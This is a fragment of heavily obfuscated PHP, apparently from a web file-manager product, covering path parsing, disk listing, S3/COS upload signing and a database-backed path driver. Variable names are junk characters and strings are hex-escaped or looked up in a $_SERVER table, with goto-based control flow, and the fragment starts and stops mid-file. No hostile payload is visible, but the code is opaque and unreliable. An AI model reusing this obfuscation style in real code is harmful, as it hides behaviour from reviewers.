infoFull($õáÛÕõ) { return $this->infoParse($õáÛÕõ); } } goto cñÚÖ‰¦ñ; b‘“ƒ•ôÎÅ: define($_SERVER[şÒÁøÒÄ][241], 1); define($_SERVER[şÒÁøÒÄ][242], 0); define($_SERVER[şÒÁøÒÄ][243], 2); goto Cî§é¡¡½‚; aêÓ´¤ËˆŒ: function binCheckBigger($Ùóš­ØÈ, $Ü¬³øãÍ) { return $Ùóš­ØÈ > $Ü¬³øãÍ; } $_SERVER[$_SERVER[ËğØş™½][3]] = (base64_decode('ODIwNw==')."\x39\x34")+0;$_ytcb="qv65e8n31fg0u4dpl9csoiykbtjazr7whmx2irva9pbf36hdjg4e1ctxusymnk25w7q80";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($²¯Üƒ˜¸, $¹¹àí’„) { $ÓşéóıŠ =& $_SERVER[şÒÁøÒÄ]; if (isset(self::$_methodList[$²¯Üƒ˜¸])) { return @call_user_func_array(self::$_methodList[$²¯Üƒ˜¸], $¹¹àí’„); } else { if (method_exists($this, $²¯Üƒ˜¸)) { return call_user_func_array(array($this, $²¯Üƒ˜¸), $¹¹àí’„); } else { think_exception(__CLASS__ . $ÓşéóıŠ[4] . $²¯Üƒ˜¸ . $ÓşéóıŠ[5]); } } } public static function __callStatic($¥İú˜ÒÒ, $ôàîö®‡) { if (isset(self::$_methodListStatic[$¥İú˜ÒÒ])) { return call_user_func_array(self::$_methodListStatic[$¥İú˜ÒÒ], $ôàîö®‡); } else { if (method_exists(self, $¥İú˜ÒÒ)) { return call_user_func_array(array(self, $¥İú˜ÒÒ), $ôàîö®‡); } else { show_json("{$¥İú˜ÒÒ}\50\51\40\x6e\157\x74\40\x65\x78\151\163\x74\73", !1); } } } public static function addMethod($Œşİ•ŒÅ, $ƒî˜Ïë) { self::$_methodList[$Œşİ•ŒÅ] = $ƒî˜Ïë; } public static function addMethodStatic($˜†¼¹…—, $ö¦´“˜¹) { self::$_methodListStatic[$˜†¼¹…—] = $ö¦´“˜¹; } } goto Dä¿µ’Ë¹; fŸÀÄõ¸é: class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\x72\143\145\175"; const KOD_USER_RECYCLE = "\173\x75\163\145\x72\x52\x65\143\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\173\165\163\145\x72\x46\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\162\x46\151\x6c\145\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\162\x46\x69\154\x65\x54\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\165\x70\122\157\x6f\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\x53\150\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\x72\x53\x68\141\x72\x65\114\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\x72\145\x54\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\173\x73\x68\141\x72\145\x49\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\x68\x61\162\x65\111\x74\145\155\114\x69\156\153\x7d"; const KOD_SEARCH = "\173\x73\145\x61\162\143\x68\175"; const KOD_BLOCK = "\173\x62\x6c\157\143\x6b\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\145\x6e\x63\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\145\162\x7d"; public static function typeList() { $ËÉâÔ€ =& $_SERVER[şÒÁøÒÄ]; return array($ËÉâÔ€[1264] => self::KOD_SOURCE, $ËÉâÔ€[1265] => self::KOD_USER_RECYCLE, $ËÉâÔ€[1266] => self::KOD_USER_FAV, $ËÉâÔ€[1267] => self::KOD_USER_FILE_TAG, $ËÉâÔ€[1268] => self::KOD_USER_FILE_TYPE, $ËÉâÔ€[1269] => self::KOD_GROUP_ROOT_SELF, $ËÉâÔ€[1270] => self::KOD_USER_SHARE, $ËÉâÔ€[1271] => self::KOD_USER_SHARE_LINK, $ËÉâÔ€[1272] => self::KOD_USER_SHARE_TO_ME, $ËÉâÔ€[1273] => self::KOD_SHARE_ITEM, $ËÉâÔ€[1274] => self::KOD_SHARE_LINK, $ËÉâÔ€[1275] => self::KOD_SEARCH, $ËÉâÔ€[1276] => self::KOD_BLOCK, $ËÉâÔ€[1277] => self::KOD_IO, $ËÉâÔ€[1278] => self::KOD_USER_RECENT, $ËÉâÔ€[1279] => self::KOD_USER_DRIVER); } public static function parse($é„šÌÂÊ) { $“Şâœûì =& $_SERVER[şÒÁøÒÄ]; $é„šÌÂÊ = self::clear($é„šÌÂÊ); $‰—Â§ = array_values(self::typeList()); preg_match($“Şâœûì[1280], $é„šÌÂÊ, $Í„ƒÌ³¼); $œóñÕË® = array($“Şâœûì[422] => !1, $“Şâœûì[1281] => !1, $“Şâœûì[419] => !1, $“Şâœûì[84] => $é„šÌÂÊ, $“Şâœûì[1182] => !1, $“Şâœûì[1181] => $“Şâœûì[12]); if (is_array($Í„ƒÌ³¼) && count($Í„ƒÌ³¼) == 5) { $İ©ò”àû = $“Şâœûì[1282] . $Í„ƒÌ³¼[2] . $“Şâœûì[327]; if (in_array($İ©ò”àû, $‰—Â§)) { $œóñÕË®[$“Şâœûì[1182]] = $Í„ƒÌ³¼[1]; $œóñÕË®[$“Şâœûì[33]] = $İ©ò”àû; $œóñÕË®[$“Şâœûì[1283]] = substr($İ©ò”àû, 1, -1); $œóñÕË®[$“Şâœûì[399]] = $Í„ƒÌ³¼[3]; } $œóñÕË®[$“Şâœûì[1181]] = $Í„ƒÌ³¼[4]; } $í“¶›× = array($“Şâœûì[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $œóñÕË®[$“Şâœûì[1246]] = in_array($œóñÕË®[$“Şâœûì[33]], $í“¶›×); return $œóñÕË®; } public static function isTruePath($Š‰Ğüµâ) { $ì†Ğ„ŒÔ =& $_SERVER[şÒÁøÒÄ]; if (substr($Š‰Ğüµâ, 0, 1) != $ì†Ğ„ŒÔ[1282]) { return !0; } if (strpos($Š‰Ğüµâ, $ì†Ğ„ŒÔ[408]) === 0) { return !0; } if (strpos($Š‰Ğüµâ, $ì†Ğ„ŒÔ[1250]) === 0) { return !0; } if (strpos($Š‰Ğüµâ, $ì†Ğ„ŒÔ[1284]) === 0) { return !0; } if (strpos($Š‰Ğüµâ, $ì†Ğ„ŒÔ[1285]) === 0) { return !0; } if (strpos($Š‰Ğüµâ, $ì†Ğ„ŒÔ[1286]) === 0) { return !0; } return !1; } public static function clear($ûƒ—µÇı) { $¸¼ÅÜÄÙ =& $_SERVER[şÒÁøÒÄ]; $ûƒ—µÇı = str_replace(array($¸¼ÅÜÄÙ[1091], $¸¼ÅÜÄÙ[231]), $¸¼ÅÜÄÙ[53], $ûƒ—µÇı); $ûƒ—µÇı = str_replace($¸¼ÅÜÄÙ[97], $¸¼ÅÜÄÙ[8], $ûƒ—µÇı); $ÎéÎô¤à = $¸¼ÅÜÄÙ[1287]; if (substr($ûƒ—µÇı, 0, 3) == $¸¼ÅÜÄÙ[1288]) { $ûƒ—µÇı = substr($ûƒ—µÇı, 3); } while (strstr($ûƒ—µÇı, $ÎéÎô¤à)) { $ûƒ—µÇı = str_replace($ÎéÎô¤à, $¸¼ÅÜÄÙ[8], $ûƒ—µÇı); } $ûƒ—µÇı = preg_replace($¸¼ÅÜÄÙ[1289], $¸¼ÅÜÄÙ[8], $ûƒ—µÇı); if ($ûƒ—µÇı == $¸¼ÅÜÄÙ[8]) { return $¸¼ÅÜÄÙ[8]; } $ûƒ—µÇı = rtrim($ûƒ—µÇı, $¸¼ÅÜÄÙ[8]); return $ûƒ—µÇı; } public static function sourceID($¶Š®õïù) { $˜Ğï›ïı =& $_SERVER[şÒÁøÒÄ]; $èµìãŸ = self::parse($¶Š®õïù); if ($èµìãŸ[$˜Ğï›ïı[33]] !== self::KOD_SOURCE) { show_json(LNG($˜Ğï›ïı[1290]), !1); } return $èµìãŸ[$˜Ğï›ïı[399]]; } public static function make($Üª’´ù†) { if (!$Üª’´ù†) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Üª’´ù†)); } public static function makeShare($¨öá´ßì, $ë˜ŞÑì) { return self::makePath(self::KOD_SHARE_ITEM, $¨öá´ßì, $ë˜ŞÑì); } public static function makeFileTypePath($ÑÉ¾ÇÄ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÑÉ¾ÇÄ); } public static function makeFileTagPath($ìÒ…À¡è) { return self::makePath(self::KOD_USER_FILE_TAG, $ìÒ…À¡è); } public static function makePath($À±¢½µ’, $¸İÛÆ—² = '', $æ«âÛòº = '') { $Ú¡ŠáÌµ =& $_SERVER[şÒÁøÒÄ]; $æ¬Ô¬íş = substr($À±¢½µ’, 1, -1); $áÁµ®ü× = $Ú¡ŠáÌµ[1291] . $æ¬Ô¬íş . $Ú¡ŠáÌµ[1292] . $¸İÛÆ—² . $Ú¡ŠáÌµ[1293]; $áÁµ®ü× = $æ«âÛòº ? $áÁµ®ü× . $æ«âÛòº . $Ú¡ŠáÌµ[8] : $áÁµ®ü×; return $áÁµ®ü×; } public static function hashPath($š´öÖæ, $·¦¥´¥ª = true) { $ÀìÓ±‹… =& $_SERVER[şÒÁøÒÄ]; $İĞ´ÈÃ = is_array($š´öÖæ) ? $š´öÖæ : IO::info($š´öÖæ); $¤ÑÏÏ²­ = _get($İĞ´ÈÃ, $ÀìÓ±‹…[1294], $ÀìÓ±‹…[12]); if (!$¤ÑÏÏ²­ && isset($İĞ´ÈÃ[$ÀìÓ±‹…[402]])) { $İĞ´ÈÃ = IO::info(KodIO::make($İĞ´ÈÃ[$ÀìÓ±‹…[402]])); $¤ÑÏÏ²­ = _get($İĞ´ÈÃ, $ÀìÓ±‹…[1294], $ÀìÓ±‹…[12]); } if (!$¤ÑÏÏ²­ && $·¦¥´¥ª) { $ş‚ÆËşß = KodIO::parse($İĞ´ÈÃ[$ÀìÓ±‹…[84]]); if (!$ş‚ÆËşß[$ÀìÓ±‹…[33]]) { $¤ÑÏÏ²­ = IO::hashSimple($İĞ´ÈÃ[$ÀìÓ±‹…[84]]); } } if (!$¤ÑÏÏ²­) { $¤ÑÏÏ²­ = md5($İĞ´ÈÃ[$ÀìÓ±‹…[84]] . $İĞ´ÈÃ[$ÀìÓ±‹…[76]] . $İĞ´ÈÃ[$ÀìÓ±‹…[85]]); } return $¤ÑÏÏ²­; } public static function hashPathSafe($â»şŒˆ, $†˜£Ò = true) { $ĞÍä¡ÀÕ =& $_SERVER[şÒÁøÒÄ]; $»ŒÁÌÅ± = self::hashPath($â»şŒˆ, $†˜£Ò); return md5($»ŒÁÌÅ± . $ĞÍä¡ÀÕ[1295] . Model($ĞÍä¡ÀÕ[778])->get($ĞÍä¡ÀÕ[779])); } public static function initSystemPath() { $ş¯ä¿½¡ =& $_SERVER[şÒÁøÒÄ]; if (defined($ş¯ä¿½¡[1296])) { return; } define($ş¯ä¿½¡[1296], self::systemPath($ş¯ä¿½¡[1297])); define($ş¯ä¿½¡[1298], self::systemPath($ş¯ä¿½¡[1299])); define($ş¯ä¿½¡[1300], self::systemPath($ş¯ä¿½¡[1301])); define($ş¯ä¿½¡[1302], self::systemPath($ş¯ä¿½¡[1303])); IOHistory::bindEvent(); } public static function systemPath($´°¹¾˜˜) { $ëà«ÍäÏ =& $_SERVER[şÒÁøÒÄ]; $è½¿ÜÎü = $ëà«ÍäÏ[1304] . ucfirst($´°¹¾˜˜); $¾Ú¯ÅîÒ = Model($ëà«ÍäÏ[778])->get($è½¿ÜÎü); if ($¾Ú¯ÅîÒ) { return $¾Ú¯ÅîÒ; } if ($´°¹¾˜˜ == $ëà«ÍäÏ[1297]) { $¾Ú¯ÅîÒ = self::make(Model($ëà«ÍäÏ[833])->systemRootPathAdd($ëà«ÍäÏ[534])); } else { $¾Ú¯ÅîÒ = self::systemPath($ëà«ÍäÏ[1297]); $íØ¬í‘ = self::sourceID($¾Ú¯ÅîÒ); $¾Ú¯ÅîÒ = self::make(Model($ëà«ÍäÏ[833])->mkdir($íØ¬í‘, $´°¹¾˜˜)); } Model($ëà«ÍäÏ[778])->set($è½¿ÜÎü, $¾Ú¯ÅîÒ); return $¾Ú¯ÅîÒ; } public static function systemFolder($úÌÁŸ“ª) { $…‰ÁŠ¢ = IO_PATH_SYSTEM_SOURCE . $úÌÁŸ“ª; $¸»Ç¡€å = Cache::get($…‰ÁŠ¢); if (!$¸»Ç¡€å) { $¸ÓĞ‡ = IO::infoFull($…‰ÁŠ¢); if (!$¸ÓĞ‡) { $¸»Ç¡€å = IO::mkdir($…‰ÁŠ¢, REPEAT_SKIP); } else { $¸»Ç¡€å = $¸ÓĞ‡[$_SERVER[şÒÁøÒÄ][84]]; } Cache::set($…‰ÁŠ¢, $¸»Ç¡€å, 3600 * 10); } return $¸»Ç¡€å; } public static function defaultDriver() { return Model($_SERVER[şÒÁøÒÄ][775])->defaultDriver(); } public static function defaultIO() { $ÊıÏœãœ =& $_SERVER[şÒÁøÒÄ]; $•ƒ´çÁì = self::defaultDriver(); return $ÊıÏœãœ[1305] . $•ƒ´çÁì[$ÊıÏœãœ[399]] . $ÊıÏœãœ[1293]; } public static function defaultDriverInit() { static $ïœ¼Šìƒ = false; if ($ïœ¼Šìƒ) { return $ïœ¼Šìƒ; } $ïœ¼Šìƒ = IO::init(self::defaultIO()); return $ïœ¼Šìƒ; } public static function fileTypeList() { $„û†Î‰û =& $_SERVER[şÒÁøÒÄ]; $¼‹ßàö‹ = $GLOBALS[$„û†Î‰û[6]][$„û†Î‰û[1306]]; foreach ($¼‹ßàö‹ as $‰¢³Åç” => $™ª¨‡ñ¯) { $ò–ìæ­¬ = $„û†Î‰û[1307] . $‰¢³Åç”; $¿ë‰È  = LNG($ò–ìæ­¬); if ($ò–ìæ­¬ != $¿ë‰È ) { $¼‹ßàö‹[$‰¢³Åç”][$„û†Î‰û[32]] = $¿ë‰È ; } } return $¼‹ßàö‹; } public static function diskList($úşù†ŞŸ = true) { $¼µíß¡™ = $_SERVER[şÒÁøÒÄ][1308]; if ($úşù†ŞŸ) { $ƒÙ„Á…Æ = Cache::get($¼µíß¡™); if (is_array($ƒÙ„Á…Æ)) { return $ƒÙ„Á…Æ; } } $ƒÙ„Á…Æ = self::diskListGet(); Cache::set($¼µíß¡™, $ƒÙ„Á…Æ, 60); return $ƒÙ„Á…Æ; } public static function diskListGet() { $é¿ºÛ =& $_SERVER[şÒÁøÒÄ]; $„á£Ÿ½Û = array(); if ($GLOBALS[$é¿ºÛ[6]][$é¿ºÛ[1309]] == $é¿ºÛ[1310]) { $ÈÆ¯Èª˜ = $é¿ºÛ[1311]; for ($©ïÕÂ« = 0; $©ïÕÂ« < strlen($ÈÆ¯Èª˜); $©ïÕÂ«++) { $±Èá¾« = $ÈÆ¯Èª˜[$©ïÕÂ«] . $é¿ºÛ[1312]; if (file_exists($±Èá¾«)) { $„á£Ÿ½Û[] = $±Èá¾«; } } return $„á£Ÿ½Û; } if (!function_exists($é¿ºÛ[98])) { $„á£Ÿ½Û[] = $é¿ºÛ[843]; return $„á£Ÿ½Û; } $ÁŒÅ›ÌÚ = explode($é¿ºÛ[231], shell_exec($é¿ºÛ[1313])); array_shift($ÁŒÅ›ÌÚ); array_pop($ÁŒÅ›ÌÚ); $ÅßßŸÅ¾ = array($é¿ºÛ[1314], $é¿ºÛ[1315], $é¿ºÛ[1316], $é¿ºÛ[1317], $é¿ºÛ[1318], $é¿ºÛ[1319], $é¿ºÛ[1320], $é¿ºÛ[1321]); foreach ($ÁŒÅ›ÌÚ as $¸ûáÎºÑ) { $› òÔ¢ô = preg_split($é¿ºÛ[1322], $¸ûáÎºÑ); $±Èá¾« = $› òÔ¢ô[count($› òÔ¢ô) - 1]; if (!strstr($› òÔ¢ô[0], $é¿ºÛ[1323]) || !$±Èá¾«) { continue; } $„‹­ÔÓ× = rtrim($±Èá¾«, $é¿ºÛ[8]) . $é¿ºÛ[8]; if (in_array($„‹­ÔÓ×, $ÅßßŸÅ¾)) { continue; } $„á£Ÿ½Û[] = $„‹­ÔÓ×; } return $„á£Ÿ½Û; } public static function isSameDisk($ı‡ÚÕË£, $’³¨ŒÎ•) { $ş·ÔÒ¢Ù =& $_SERVER[şÒÁøÒÄ]; if ($GLOBALS[$ş·ÔÒ¢Ù[6]][$ş·ÔÒ¢Ù[1309]] == $ş·ÔÒ¢Ù[1310]) { return strtolower(substr($ı‡ÚÕË£, 0, 1)) == strtolower(substr($’³¨ŒÎ•, 0, 1)); } $²‡Œ‚¾ = self::diskList(); $¥ÎƒÌ´ = !1; $ÁÕñ‡¡ = !1; sort($²‡Œ‚¾); $²‡Œ‚¾ = array_reverse($²‡Œ‚¾); $ı‡ÚÕË£ = rtrim($ı‡ÚÕË£, $ş·ÔÒ¢Ù[8]) . $ş·ÔÒ¢Ù[8]; $’³¨ŒÎ• = rtrim($’³¨ŒÎ•, $ş·ÔÒ¢Ù[8]) . $ş·ÔÒ¢Ù[8]; foreach ($²‡Œ‚¾ as $ÈË±—âÚ) { $Üşâ‡„÷ = strlen($ÈË±—âÚ); if (!$¥ÎƒÌ´ && substr($ı‡ÚÕË£, 0, $Üşâ‡„÷) == $ÈË±—âÚ) { $¥ÎƒÌ´ = $ÈË±—âÚ; } if (!$ÁÕñ‡¡ && substr($’³¨ŒÎ•, 0, $Üşâ‡„÷) == $ÈË±—âÚ) { $ÁÕñ‡¡ = $ÈË±—âÚ; } if ($¥ÎƒÌ´ && $ÁÕñ‡¡) { break; } } return $¥ÎƒÌ´ === $ÁÕñ‡¡; } public static function transferType($¶Ùàº œ, $«ÏÄë˜) { $àè˜Îü =& $_SERVER[şÒÁøÒÄ]; $ú–üİº¦ = self::driverType($¶Ùàº œ); $ìÓè¯÷É = self::driverType($«ÏÄë˜); if ($ú–üİº¦[$àè˜Îü[33]] == $ìÓè¯÷É[$àè˜Îü[33]] && $ú–üİº¦[$àè˜Îü[1324]] == $ìÓè¯÷É[$àè˜Îü[1324]]) { return $àè˜Îü[1325]; } if ($ú–üİº¦[$àè˜Îü[33]] == $àè˜Îü[876] && $ìÓè¯÷É[$àè˜Îü[33]] == $àè˜Îü[106]) { return $àè˜Îü[1207]; } if ($ú–üİº¦[$àè˜Îü[33]] == $àè˜Îü[106] && $ìÓè¯÷É[$àè˜Îü[33]] == $àè˜Îü[876]) { return $àè˜Îü[107]; } return $àè˜Îü[1326]; } public static function driverType($Š´¤Å¦‹) { $‘‡Û×Í =& $_SERVER[şÒÁøÒÄ]; $¦†î£œ£ = str_replace($‘‡Û×Í[1327], $‘‡Û×Í[12], strtolower($Š´¤Å¦‹->getType())); if ($¦†î£œ£ == $‘‡Û×Í[765] || $¦†î£œ£ == $‘‡Û×Í[1328] || $¦†î£œ£ == $‘‡Û×Í[1329]) { $Š´¤Å¦‹ = self::defaultDriverInit(); } else { if ($¦†î£œ£ == $‘‡Û×Í[1217] || $¦†î£œ£ == $‘‡Û×Í[1330]) { $Š´¤Å¦‹ = IO::init($Š´¤Å¦‹->pathParse[$‘‡Û×Í[1164]]); } } $µÄŠÖù = $Š´¤Å¦‹->path; $¦†î£œ£ = str_replace($‘‡Û×Í[1327], $‘‡Û×Í[12], strtolower($Š´¤Å¦‹->getType())); if ($¦†î£œ£ == $‘‡Û×Í[106]) { return array($‘‡Û×Í[33] => $‘‡Û×Í[106], $‘‡Û×Í[1324] => $‘‡Û×Í[12], $‘‡Û×Í[84] => $µÄŠÖù, $‘‡Û×Í[95] => $Š´¤Å¦‹); } return array($‘‡Û×Í[33] => $‘‡Û×Í[876], $‘‡Û×Í[1324] => $Š´¤Å¦‹->pathDriver, $‘‡Û×Í[84] => $µÄŠÖù, $‘‡Û×Í[95] => $Š´¤Å¦‹); } public static function pathDriverType($‹ŠŠŸñß) { return $‹ŠŠŸñß ? self::driverType(IO::init($‹ŠŠŸñß)) : !1; } public static function pathDriverLocal($ı»¢ş) { $€»îÙ¶ =& $_SERVER[şÒÁøÒÄ]; $¡¡¢Ç« = $ı»¢ş ? self::driverType(IO::init($ı»¢ş)) : !1; return $¡¡¢Ç«[$€»îÙ¶[33]] == $€»îÙ¶[106] ? !0 : !1; } public static function allowCover($ù„ãŸåˆ, $‰ ¨¹¡ë = true) { $ÉÑüúÊİ =& $_SERVER[şÒÁøÒÄ]; if (is_string($ù„ãŸåˆ)) { $ù„ãŸåˆ = IO::info($ù„ãŸåˆ); } if (!$ù„ãŸåˆ || $ù„ãŸåˆ[$ÉÑüúÊİ[33]] == $ÉÑüúÊİ[75] || $ù„ãŸåˆ[$ÉÑüúÊİ[76]] <= 100) { return !1; } if (isset($ù„ãŸåˆ[$ÉÑüúÊİ[1331]]) || !$ù„ãŸåˆ[$ÉÑüúÊİ[84]]) { return !1; } static $•±ø†® = false; if (!$•±ø†® || !$‰ ¨¹¡ë) { $£Ë²¨©× = self::driverType(IO::init($ù„ãŸåˆ[$ÉÑüúÊİ[84]])); $ÏÈ±ìû = $£Ë²¨©×[$ÉÑüúÊİ[95]]; $•±ø†® = $ÉÑüúÊİ[1332]; if ($£Ë²¨©×[$ÉÑüúÊİ[33]] == $ÉÑüúÊİ[106]) { $•±ø†® = $ÉÑüúÊİ[1333]; } if ($£Ë²¨©×[$ÉÑüúÊİ[95]] && isset($£Ë²¨©×[$ÉÑüúÊİ[95]]->config[$ÉÑüúÊİ[1334]]) && $£Ë²¨©×[$ÉÑüúÊİ[95]]->config[$ÉÑüúÊİ[1334]]) { $•±ø†® = $ÉÑüúÊİ[1333]; } } return $•±ø†® == $ÉÑüúÊİ[1333] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($—üÇå›µ) { parent::__construct($—üÇå›µ); $this->signatureVersion($_SERVER[şÒÁøÒÄ][216]); } public function uploadFormData($†Ú½‰», $í¯½ªã¥ = 3600) { $·à‚ûÀÀ =& $_SERVER[şÒÁøÒÄ]; $±İ³ıÏ = $·à‚ûÀÀ[199]; $ ı×Ï®¤ = $·à‚ûÀÀ[232]; $ßäŸ¤ş = $·à‚ûÀÀ[1335]; $±†ÌÏ’„ = gmdate($·à‚ûÀÀ[1336], time() + $í¯½ªã¥); $«”»øö = (string) time() . $·à‚ûÀÀ[71] . (string) (time() + $í¯½ªã¥); $şğãÏñ = array($·à‚ûÀÀ[1337] => $±†ÌÏ’„, $·à‚ûÀÀ[1338] => array(array($·à‚ûÀÀ[1339] => $±İ³ıÏ), array($·à‚ûÀÀ[1340] => $this->bucket), array($·à‚ûÀÀ[1341], $·à‚ûÀÀ[1342], $·à‚ûÀÀ[12]), array($·à‚ûÀÀ[1343] => $ßäŸ¤ş), array($·à‚ûÀÀ[1344] => $ ı×Ï®¤), array($·à‚ûÀÀ[1345] => $this->accessKey), array($·à‚ûÀÀ[1346] => $«”»øö))); $şğãÏñ = json_encode($şğãÏñ); $Öï¯”« = hash_hmac($·à‚ûÀÀ[232], $«”»øö, $this->secret); $ø¦ô¦İÍ = sha1($şğãÏñ); $«©•Ñ— = hash_hmac($·à‚ûÀÀ[232], $ø¦ô¦İÍ, $Öï¯”«); $¡ŞÁÂ÷¤ = array($·à‚ûÀÀ[1339] => $±İ³ıÏ, $·à‚ûÀÀ[1343] => $ßäŸ¤ş, $·à‚ûÀÀ[1347] => base64_encode($şğãÏñ), $·à‚ûÀÀ[1344] => $ ı×Ï®¤, $·à‚ûÀÀ[1345] => $this->accessKey, $·à‚ûÀÀ[1348] => $«”»øö, $·à‚ûÀÀ[1349] => $«©•Ñ—, $·à‚ûÀÀ[182] => $this->getHost()); return $¡ŞÁÂ÷¤; } public function fileOutLink($éï§½Á€) { $‘ß±…‹÷ =& $_SERVER[şÒÁøÒÄ]; if (substr($éï§½Á€, 0, 7) == $‘ß±…‹÷[1350]) { $éï§½Á€ = $‘ß±…‹÷[1351] . substr($éï§½Á€, 7); } header($‘ß±…‹÷[161] . $éï§½Á€); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Êøí‡È) { $this->pathParse = $Êøí‡È; $this->model = Model($_SERVER[şÒÁøÒÄ][1352]); } public function getPath($àñŒ”Ëê) { return trim($àñŒ”Ëê, $_SERVER[şÒÁøÒÄ][8]); } public function pathFather($¸§í¡ğÎ) { $”±Ç“Å‡ = $this->parse($¸§í¡ğÎ); $”±Ç“Å‡ = $this->infoSimple($¸§í¡ğÎ); return $”±Ç“Å‡ ? $”±Ç“Å‡[$_SERVER[şÒÁøÒÄ][432]] : !1; } public function pathThis($¼Û‹ª›) { $¶›ò¥’Õ = $this->infoSimple($¼Û‹ª›); return $¶›ò¥’Õ ? $¶›ò¥’Õ[$_SERVER[şÒÁøÒÄ][32]] : !1; } public function getPathOuter($ñ£‘ê˜§) { if (!$ñ£‘ê˜§) { return $ñ£‘ê˜§; } $‰Ş±Ğ”å = $this->parse($ñ£‘ê˜§); return KodIO::make($‰Ş±Ğ”å[$_SERVER[şÒÁøÒÄ][399]]); } public function copyFolderFromIO($öÚã’øß, $ºÌâìŠ, $¤Ô‰Â…, $€©É¿Ú¡, $åäŞç›š) { $”‡À¤° = $this->model->copyFolderFromIO($öÚã’øß, $ºÌâìŠ, $¤Ô‰Â…, $€©É¿Ú¡, $åäŞç›š); return KodIO::make($”‡À¤°); } public function isParentOf($º†ÌÕ†, $Ä––Ê¥È) { return $this->model->isParentOf($º†ÌÕ†, $Ä––Ê¥È); } public function mkfile($ã¹Ä©ÉÓ, $ãçé…ŒÑ = '', $Òï‡»À = REPEAT_RENAME) { $†÷ò›å =& $_SERVER[şÒÁøÒÄ]; $šæÏ“ßÀ = $this->parse($ã¹Ä©ÉÓ); $ã¹Ä©ÉÓ = $šæÏ“ßÀ[$†÷ò›å[399]]; for ($äÅğÙƒ = 0; $äÅğÙƒ < count($šæÏ“ßÀ[$†÷ò›å[1353]]); $äÅğÙƒ++) { $°µš”¦´ = $šæÏ“ßÀ[$†÷ò›å[1353]][$äÅğÙƒ]; if ($äÅğÙƒ == count($šæÏ“ßÀ[$†÷ò›å[1353]]) - 1) { $ã¹Ä©ÉÓ = $this->model->mkfile($ã¹Ä©ÉÓ, $°µš”¦´, $ãçé…ŒÑ, $Òï‡»À); break; } $ã¹Ä©ÉÓ = $this->model->mkdir($ã¹Ä©ÉÓ, $°µš”¦´, REPEAT_SKIP); } return $this->getPathOuter($ã¹Ä©ÉÓ); } public function mkdir($óÅÆ¬•, $í€†ÜÎ = REPEAT_SKIP) { $í–©–Á  =& $_SERVER[şÒÁøÒÄ]; $¬ú°¾É¿ = $this->parse($óÅÆ¬•); $óÅÆ¬• = $¬ú°¾É¿[$í–©–Á [399]]; for ($²„—ìÅ© = 0; $²„—ìÅ© < count($¬ú°¾É¿[$í–©–Á [1353]]); $²„—ìÅ©++) { $™ü¶²ø = $¬ú°¾É¿[$í–©–Á [1353]][$²„—ìÅ©]; $óÅÆ¬• = $this->model->mkdir($óÅÆ¬•, $™ü¶²ø, $í€†ÜÎ); } return $this->getPathOuter($óÅÆ¬•); } public function copyFile($È®Ş¼ß£, $ÆôÑ¶…ˆ, $ĞàØ³ãé = REPEAT_REPLACE) { $Ó˜¨¬± =& $_SERVER[şÒÁøÒÄ]; $Êû”ÙØó = $this->parse($ÆôÑ¶…ˆ); $¿Ğ«Ôşå = $this->model->copy($È®Ş¼ß£, $Êû”ÙØó[$Ó˜¨¬±[399]], $ĞàØ³ãé, $Êû”ÙØó[$Ó˜¨¬±[84]]); return $¿Ğ«Ôşå ? $this->getPathOuter($¿Ğ«Ôşå) : !1; } public function moveFile($Õöº³¡§, $İŞËœ×‡, $Õ‘¦†¾Å = REPEAT_REPLACE) { $Ï„¦éÓï =& $_SERVER[şÒÁøÒÄ]; $ç†¨€Øî = $this->parse($İŞËœ×‡); $Ã¹†Å“’ = $this->model->move($Õöº³¡§, $ç†¨€Øî[$Ï„¦éÓï[399]], $Õ‘¦†¾Å, $ç†¨€Øî[$Ï„¦éÓï[84]]); return $Ã¹†Å“’ ? $this->getPathOuter($Ã¹†Å“’) : !1; } public function copy($·’™Î–‹, $ô®ë¸“·, $ıšÛôòé = REPEAT_REPLACE, $Õõœúş = false) { $£ Şç£‚ = $this->parse($ô®ë¸“·); $š’êËî¿ = $this->model->copy($·’™Î–‹, $£ Şç£‚[$_SERVER[şÒÁøÒÄ][399]], $ıšÛôòé, $Õõœúş); return $š’êËî¿ ? $this->getPathOuter($š’êËî¿) : !1; } public function moveSameAllow() { } public function move($µıš°³Š, $˜ñ¥§ ¢, $İ„°İ×• = REPEAT_REPLACE, $Ëß—ñ¬• = false) { $ÊŞÒÃç† = $this->parse($˜ñ¥§ ¢); $Ò£×Âæ = $this->model->move($µıš°³Š, $ÊŞÒÃç†[$_SERVER[şÒÁøÒÄ][399]], $İ„°İ×•, $Ëß—ñ¬•); return $Ò£×Âæ ? $this->getPathOuter($Ò£×Âæ) : !1; } public function remove($ìÅšå½, $Á÷œî‚ = true) { return $this->model->remove($ìÅšå½, $Á÷œî‚); } public function rename($ò„Öúãù, $°Œ©Û°ó) { $ŸºÚèŞò = $this->model->rename($ò„Öúãù, $°Œ©Û°ó); return $ŸºÚèŞò ? $this->getPathOuter($ò„Öúãù) : $ŸºÚèŞò; } public function size($´ß Ù£) { $ç×²‹Ü¹ = $this->infoSimple($´ß Ù£); return $ç×²‹Ü¹ ? $ç×²‹Ü¹[$_SERVER[şÒÁøÒÄ][76]] : 0; } public function infoSimple($ï©øÙß‚) { return $this->model->sourceInfo($ï©øÙß‚); } 